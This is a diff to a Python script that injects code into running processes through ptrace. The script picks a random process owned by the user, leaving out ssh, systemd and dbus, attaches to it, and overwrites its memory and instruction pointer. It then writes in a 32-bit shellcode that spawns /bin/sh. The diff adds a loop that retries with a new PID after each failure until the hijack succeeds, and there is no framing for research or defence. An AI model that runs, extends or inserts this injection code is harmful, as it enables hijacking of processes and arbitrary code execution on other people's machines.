@@ -17,6 +17,7 @@ import struct
 import sys
 import os
 import random
+import time
 
 libc = ctypes.CDLL('libc.so.6')
 
@@ -63,9 +64,9 @@ def set_regs(pid, regs):
 
 def pick_user_process():
     """
-    Pick a random user process, excluding system processes and SSH processes.
+    Pick a suitable user process that is safe to hijack, avoiding critical system processes or SSH processes.
     Returns:
-        int: The PID of the randomly selected user process.
+        int: The PID of the selected user process.
     """
     user_uid = os.getuid()
     processes = []
@@ -80,7 +81,7 @@ def pick_user_process():
                     if uid == user_uid:
                         with open(f'/proc/{proc}/cmdline', 'r') as cmd_file:
                             cmdline = cmd_file.read()
-                            if 'ssh' not in cmdline:
+                            if 'ssh' not in cmdline and 'systemd' not in cmdline and 'dbus' not in cmdline:
                                 processes.append(int(proc))
             except (FileNotFoundError, IndexError, PermissionError):
                 continue
@@ -88,45 +89,60 @@ def pick_user_process():
     if not processes:
         raise Exception("No suitable user processes found.")
 
-    return random.choice(processes)
+    # Select a less critical process by filtering out common system services
+    safe_processes = [pid for pid in processes if pid > 1000]
+    if not safe_processes:
+        raise Exception("No suitable non-critical user processes found.")
+
+    return random.choice(safe_processes)
 
 def start_hijacking():
-    # Pick a random user process PID, excluding SSH processes
-    pid = pick_user_process()
-    print(f"Selected PID: {pid}")
+    try:
+        while True:
+            try:
+                # Pick a suitable user process PID, avoiding critical system processes and SSH processes
+                pid = pick_user_process()
+                print(f"Selected PID: {pid}")
 
-    # Attach to the process
-    attach_process(pid)
+                # Attach to the process
+                attach_process(pid)
 
-    # Read the process' memory
-    addr = 0x10000000
-    word = peek_text(pid, addr)
-    print(f"Original word at 0x{addr:08x}: 0x{word:08x}")
+                # Read the process' memory
+                addr = 0x10000000
+                word = peek_text(pid, addr)
+                print(f"Original word at 0x{addr:08x}: 0x{word:08x}")
 
-    # Patch the process' memory
-    new_word = 0xDEADBEEF
-    poke_text(pid, addr, new_word)
-    print(f"Patched word at 0x{addr:08x}: 0x{peek_text(pid, addr):08x}")
+                # Patch the process' memory
+                new_word = 0xDEADBEEF
+                poke_text(pid, addr, new_word)
+                print(f"Patched word at 0x{addr:08x}: 0x{peek_text(pid, addr):08x}")
 
-    # Get the thread's registers
-    regs = get_regs(pid)
-    print(f"Original registers: {regs}")
+                # Get the thread's registers
+                regs = get_regs(pid)
+                print(f"Original registers: {regs}")
 
-    # Modify the thread's registers
-    regs.eip = 0x12345678  # Modify the EIP register
-    set_regs(pid, regs)
-    print(f"Modified registers: {get_regs(pid)}")
+                # Modify the thread's registers
+                regs.eip = 0x12345678  # Modify the EIP register
+                set_regs(pid, regs)
+                print(f"Modified registers: {get_regs(pid)}")
 
-    # Run the shellcode
-    shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
-    for i in range(0, len(shellcode), 4):
-        chunk = shellcode[i:i+4]
-        chunk = chunk.ljust(4, b'\x00')  # Ensure the chunk is 4 bytes
-        poke_text(pid, addr + i, int.from_bytes(chunk, 'little'))
+                # Run the shellcode
+                shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
+                for i in range(0, len(shellcode), 4):
+                    chunk = shellcode[i:i+4]
+                    chunk = chunk.ljust(4, b'\x00')  # Ensure the chunk is 4 bytes
+                    poke_text(pid, addr + i, int.from_bytes(chunk, 'little'))
 
-    set_regs(pid, regs)  # Restore the original registers
+                set_regs(pid, regs)  # Restore the original registers
 
-    # Detach from the process
-    detach_process(pid)
+                # Detach from the process
+                detach_process(pid)
 
-    print("Shellcode executed. Check the process' output.")
+                print("Shellcode executed. Check the process' output.")
+                return "Process hijacking completed successfully."
+            except (ctypes.ArgumentError, OSError, Exception) as e:
+                print(f"Error occurred: {e}. Retrying with a different PID...")
+                time.sleep(1)  # Give it some time before retrying
+    except Exception as e:
+        print(f"Error occurred: {e}.")
+        raise Exception("Process hijacking failed")  # Raise an exception
